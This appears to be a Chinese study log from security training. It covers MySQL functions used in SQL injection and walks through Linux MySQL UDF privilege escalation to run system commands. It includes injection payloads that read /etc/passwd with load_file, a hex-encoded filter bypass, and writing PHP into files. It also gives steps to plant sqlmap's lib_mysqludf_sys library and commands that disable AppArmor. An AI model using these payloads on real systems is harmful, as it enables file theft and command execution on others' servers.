## Week4-数据库系统功能相关学习

### 0x00 任务目标

1. 学习数据库自带函数的功能和用法（思考在什么情况下可以使用）；
2. 将所有涉及的函数进行测试并举例说明其用法；
3. **扩展学习：**针对不同数据库构造所需环境，尝试执行系统命令。



### 0x01 MySQL常用函数

在进行sql注入过程中，会使用到mysql中的内置函数。在内置函数中，又分为获取信息的函数和功能函数。
信息函数是用来获取mysql中的数据库的信息，功能函数就是传统的函数用来完成某项操作。

1. 常用的信息函数

   - `database()`：用于获取当前使用的数据库信息

     ![](https://i.loli.net/2019/09/01/kHTNF6UoWxnZBim.png)

   - `version()`：返回数据库的版本

     ![](https://i.loli.net/2019/09/01/nuBY8U1WcEGFKDa.png)

   - `user()`：返回当前的用户（等价于current_user参数）

     ![](https://i.loli.net/2019/09/01/N3Y1HSFA4PjyXih.png)

   - `@@datadir`：获取数据库的存储位置

     ![](https://i.loli.net/2019/09/01/nbvtak6T7yXpr5J.png)

2. 常见的功能函数

   - `load_file()`：从计算机中载入文件，读取文件中的数据

     ```mysql
     select * from table union select 1, load_file('/etc/passwd'), 3
     select * from table union select 1, load_file(0x2F6574632F706173737764), 3 #使用十六进制绕过单引号限制
     ```

   - `into_outfile()`：写入文件，前提是具有写入条件

     ```mysql
     select '<?php phpinfo(); ?>' into outfile '/tmp/xxx.php';
     ```

   - `concat()`：返回两个参数相连接产生的字符串。如果其中一个参数为NULL，则返回值为NULL。

     ![](https://i.loli.net/2019/09/02/rACWF9Ppve2ykfn.png)

   - `group_concat()`：用于合并多条记录中的结果。用法如下：

     ![](https://i.loli.net/2019/09/02/OFPjlCwrDfgo2aE.png)

     返回的就是users表中所有的用户名，并且是作为一条记录返回。

   - `substr()`：用于截断字符串。用法为：`substr(str, pos, length)`，注意`pos`是从1开始的。

     ![](https://i.loli.net/2019/09/02/PCRvu4mXKnriNTZ.png)

   - `ascii()`：返回字符所对应的ascii码。

     ```mysql
     select ascii('a');          #返回97
     ```

   - `length()`：返回字符串的长度。

     ```mysql
     select length('123456')     #返回6
     ```

   - `if(exp1, exp2, exp3)`：如果exp1是True，则返回exp2；否则返回exp3。如：

     ```mysql
     select 1,2,if(1=1,3,-1) #1,2,3
     select 1,2,if(1=2,3,-1) #1,2,-1
     ```

   - `ifnull(exp1, exp2)`：如果exp1是True，则返回exp1；否则返回exp2。如：

     ```mysql
     select ifnull(sleep(2), 2);
     ```

   - `nullif(exp1, exp2)`：如果exp1==exp2，则返回Null；否则返回exp2。

   以上就是在进行sql注入工程中常用的函数。当然还存在一些使用的不是很多的函数。

### 0x02 Linux MySQL UDF提权

#### Step1 获取UDF文件

   1. 查看MySQL版本
   
      ```mysql
      select version();
      ```
   
      ![](https://i.loli.net/2019/09/04/Eqbomf7AdWHCJ46.png)
   
      Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下
   
   2. 查找Plugin目录
   
      ```mysql
      select @@plugin_dir;
      ```
   
      ![](https://i.loli.net/2019/09/04/kbd7FAIYerymlJa.png)
   
   3. 查看系统版本
   
      ```mysql
      show variables like '%compile%';
      ```
   
      ![](https://i.loli.net/2019/09/05/VJ1i2fDFLjlcO8C.png)
   
   4. 在Kali Linux中找到合适的UDF
   
      ![1567644797501](C:\Users\51196\AppData\Roaming\Typora\typora-user-images\1567644797501.png)
   
      > 注：新版sqlmap 为了防止文件被误杀，对文件进行异或加密，需要使用`/usr/share/sqlmap/extra/cloak/`路径下的cloak.py解密脚本对`lib_mysqludf_sys.so_`进行解码，即`python cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_`得到`lib_mysqludf_sys.so`文件

#### Step2 上传UDF文件

1. 首先确保MySQL允许对任意路径进行读写操作，即`secure_file_priv =`
   
   ![](https://i.loli.net/2019/09/05/X6zFtU5wSbcB4Me.png)
   
2. 将`lib_mysqludf_sys.so`传至`/tmp/`路径下，使用`load_file()`对其读取，并转换成十六进制文件后再写入`/tmp/`目录下：    
   ```mysql
   select hex(load_file('/tmp/lib_mysqludf_sys.so')) into dumpfile '/tmp/udf.hex'
   ```

   ![](https://i.loli.net/2019/09/05/U8WL4isHGR135SZ.png)

3. 读取`udf.hex`文件的内容，并上传至`/usr/bin/mysql/plugin/`：
   ```mysql
   select 0x[udf.hex内容] into dumpfile '/usr/bin/mysql/plugin/udf.so'
   ```
#### Step3 执行命令

1. 安装UDF

   ```mysql
   create function sys_eval returns string sonme 'udf.so';
   ```

   ![](https://i.loli.net/2019/09/05/UNbKlLsftYQFX1h.png)

2. 执行系统命令

   ![](https://i.loli.net/2019/09/05/yxeQCoJdXN8kMlT.png)

### 0x03 踩过的坑

1. 在设置 `secure_file_privilege=''` 且目录权限为 `777` 后`load_file()` 无法读取文件。

   - [检查Apparmor配置](https://bingslient.github.io/2019/08/16/MySQL%20%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E8%A1%A8%E7%9A%84%E5%88%A9%E7%94%A8/#%E4%BD%BF%E7%94%A8-load-file-%E5%87%BD%E6%95%B0)
   - 检查文件的用户组是否是属于mysql

2. 无法上传`udf.so`至`/usr/bin/mysql/plugin/`目录。

   - 检查该目录的其他组用户受否有读写权限
   - 检查文件的用户组是否是属于mysql

3. 上传`udf.so`至指定目录后，`create function`失败。

   - UDF使用的版本和本机环境不匹配
   - 没有对sqlmap中的UDF文件进行解码操作

4. 使用`select sys_eval();`执行命令返回`NULL`。

   [取消Apparmor对mysqld service的限制](https://www.cyberciti.biz/faq/ubuntu-linux-howto-disable-apparmor-commands/)

   简单来说就是执行下面两个命令：

   ```bash
   sudo ln -s /etc/apparmor.d/usr.sbin.mysqld /etc/apparmor.d/disable/
   sudo apparmor_parser -R /etc/apparmor.d/usr.sbin.mysqld
   ```

   